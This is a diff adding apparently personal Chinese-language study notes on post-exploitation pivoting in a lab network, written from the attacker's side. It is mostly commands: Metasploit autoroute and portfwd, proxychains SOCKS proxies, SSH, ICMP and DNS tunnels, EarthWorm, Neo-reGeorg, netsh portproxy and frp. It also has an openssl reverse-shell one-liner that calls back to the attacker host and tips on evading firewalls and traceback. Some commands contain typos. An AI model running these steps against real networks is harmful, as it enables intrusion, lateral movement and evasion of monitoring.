@@ -1,0 +1,187 @@
+pivotiing（派我听）和自动路由
+黑客（192.168.152.130）--------（192.168.1.185）ser1（172.16.214.142）------（172.16.214.134）ser2
+内网--外网
+（不在同一网段，无法访问一些页面如企业OA等页面）
+
+run get_local_subnets
+收集子网信息
+
+设置静态路由
+run autoroute -s 172.16.214.0/24(目标ip，24位，每个数代表8位）
+查看是否添加成功
+run autoroute -p
+
+利用被入侵的主机作为跳板攻击其他主机
+
+扫描内网
+run post/windows/gather/arp_scanner RHOSTS=172.16.214.0/24
+
+使用socks代理
+1、use auxiliary/server/socks_proxy
+show options(举例）
+srvhost 127.0.0.1
+srvport  10044
+version  4a
+run
+2、编辑/etc/proxychains4.conf
+socks4 127.0.0.1 10044 (流量走这个端口）
+3、命令打开火狐进行内网访问
+proxychains firefox
+
+proxychains(相当于进入内网后的主机）
+proxychains nmap ip
+黑客（192.168.152.130）--------（192.168.1.185）ser1（172.16.214.142）------（172.16.214.134）ser2
+(28条消息) 端口映射和端口转发的区别（一个菜比的理解）_Mhyer的博客-CSDN博客_端口映射和端口转发的区别
+端口转发和映射，两种不同的实现方式，来实现相同的目的
+拿到主机shell后，meterpreter
+端口映射
+1、portfwd flush（清空规则）
+2、portfwd add -L 192.168.152.130(黑客ip） -l 2020（黑客端口） -p 80（目标端口）-r 172.16.214.141（中间人）
+192.168.152.130:2020<---->172.16.214.141:80
+
+端口转发
+1、portfwd flush（清空规则）
+2、portfwd add -l 5555 -p 3389 -r 172.16.214.141
+3、rdesktop 127.0.0.1:5555 (开启远程桌面）
+（本地连接kali--kali通过ser1转发到ser2--步步渗透）--破解自己的5555端口，就是破解对方密码
+
+黑客（192.168.152.130）--------（192.168.1.185）ser1（172.16.214.142）------（172.16.214.134）ser2
+ssh隧道
+正向隧道
+1、中间人上设置映射
+ssh -CNfL 0.0.0.0:7777:172.16.214.134:80 root@127.0.0.1
+password:本机密码
+
+反向隧道（越过一些防火墙规则）
+1、ssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.152.130
+(把本地的22端口映射到黑客的2222端口）
+2、黑客主机
+ssh -p 2222 root@127.0.0.1
+(黑客连接自己的2222端口）
+建立反向隧道时，建议使用小权限用户，防止反追踪
+
+本地socket5代理---海外socket5一般用来翻墙
+1、黑客主机,开启socket5
+ssh -qTfnN -D 7070 root@192.168.1.185
+password(ser1)
+2、浏览器设置socket5代理
+
+ssh本地转发访问
+1、黑客主机
+ssh -L (可以写0.0.0.0:,也可以不写）6666:172.16.214.134:80 root@192.168.1.182 -fN
+password(ser1)
+2、ps aux | grep 6666
+进程测试
+
+ssh远程转发访问
+（属于反向连接，有利于滤过防火墙）
+状态---ser1与ser2都被拿下，但发现ser2里面有更深层次的网络
+1、修改ser1的ssh配置
+nano /etc/ssh/ssh_config
+GatewayPorts yes 
+2、ser2上操作
+ssh -R 8877:172.16.214.134:80 root@192.168.1.185
+
+openssl反弹加密
+1、黑客主机
+生成字签名证书
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+监听端口
+openssl  s_server -quiet -key key.pem -cert cert.pem -port 8080
+2、ser1
+mkfifp /tmp/s;bin/sh -i /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.186:8080 > /tmp/s;rm /tmp/s
+（类似nc的反弹加密）
+防止其他人监控流量
+
+netsh端口映射
+1、ser1的powershell
+netsh interface portproxy add v4tov4(ipv4对应ipv4） listenport=7777 connectaddress=172.16.214.141 connectport=80
+2、show all 查看设置
+3、干掉设置
+netsh interface portproxy reset
+
+netsh进行msf代理
+1、生成连接ser1的木马 lhost=172.16.214.140
+2、监听黑客ip与端口
+3、ser1将信息转发到黑客ip端口
+netsh interface portproxy add v4tov4(ipv4对应ipv4） listenport=4455 connectaddress=192.168.1.186 connectport=4455
+黑客（192.168.1.186）--------（192.168.1.231）ser1（172.16.214.140）------（172.16.214.141）ser2
+neo-regreg代理（脚本设置代理）
+neo-regreg下载
+1、操作命令
+python neoreg.py generate -k mima123(k后设置密码）
+生成密码为mima123的脚本
+2、连接
+python neoreg.py generate -k mima123 -u url
+成功建立隧道
+修改proxychains_config
+socket5 127.0.0.1:1080
+
+earthworm代理
+正向代理
+1、把对应文件复制到ser1
+ew_for_Win.exe -s ssocksd -l 8888
+2、黑客主机
+nano /etc/proxychains
+socks5 192.168.1.231 8888
+3、代理命令操作
+
+反向代理（ser2有更深层次的网络）
+1、ser1
+ew -s rcsocks -l 1080 -e 1024
+2、ser2
+ew -s rssocks -d 172.16.214.140 -e 1024
+黑客（192.168.1.186）--------（192.168.1.185）ser1（172.16.214.142）------（172.16.214.141）ser2
+icmp隧道（ping包流量，防火墙基本不会注意）
+1、在ser1装ptunnel
+apt-get install ptunnel
+2、黑客主机
+ptunnel -p 192.168.1.185 -lp 8080 -da 172.16.214.141 -dp 80 -x 1234(密码）
+
+dns隧道(突破防火墙）
+黑客访问中间人 中间人和目标进行dns通信
+
+dns2tcpd
+-F    强制后台运行，默认在后台
+-i    监听ip，默认0.0.0.0
+-f    配置文件
+-d    debug级别
+
+dns2tcpc
+-c    启用压缩
+-z    指定使用域名
+-d    调试级别（1，2，3）
+-r    访问目标资源
+-f    配置文件路径
+-l    本地监听端口
+-T    DNS请求类型，默认TXT
+
+在vps服务商把udp53号端口打开（出和入），使用dns.xxx.com的A记录指向ser1的ip
+1、ser1与黑客主机
+apt-get install dns2tcp
+2、ser1
+3、黑客主机
+dns2tcpc -r ssh -k haha123 -z dns.xxx.com 192.168.1.185 -l 8888 -c -d 3 
+ssh -p 8888 127.0.0.1
+password(-k haha123)
+
+frp内网穿透（用的非常多）
+ser1=frp server
+ser2=frp client
+1、黑客主机
+nano frps.ini
+bind_port=7000
+token=haha123
+
+chmod +x ./frps
+./frps -c frps.ini
+frps -c frps.ini (启动frp的服务端）
+2、ser1
+nano frpc.ini
+{
+server_addr=172.16.214.142
+token=haha123
+}
+frpc -c frpc.ini
+
+两边内网的桥梁
